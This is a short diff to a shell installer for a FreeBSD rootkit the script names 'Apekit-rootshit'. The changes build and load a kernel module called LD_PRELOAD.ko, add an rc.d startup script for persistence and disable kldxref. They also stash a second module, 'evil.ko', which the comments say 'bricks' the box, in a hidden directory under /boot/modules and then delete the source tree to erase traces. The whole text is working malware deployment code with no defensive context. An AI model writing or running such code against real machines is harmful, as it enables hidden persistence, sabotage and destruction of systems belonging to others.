@@ -8,7 +8,8 @@ fi
 # make writable
 mount -o rw /
 
-make
+# only make it if it doesn't exist
+[ -f LD_PRELOAD.ko ] || make
 
 # mv LD_PRELOAD.ko LD_PRELOAD
 LKM_NAME="LD_PRELOAD.ko"
@@ -27,3 +28,15 @@ chmod +x /usr/local/etc/rc.d/ldpreload.sh
 sed -i '' 's/^kldxref_enable="YES"/kldxref_enable="NO"/' /etc/rc.conf
 
 kldload "/boot/modules/$LKM_NAME"
+
+# create and put the LKM that "bricks" the box into a hidden directory 
+# you can later load this yourself but nothing works it with automatically
+mkdir /boot/modules/.evil
+cd unused/brick_box/
+# only run make if the file does not exist
+[ -f evil.ko ] || make
+mv evil.ko /boot/modules/.evil/
+
+cd ../../..
+rm -rf Apekit-rootshit
+
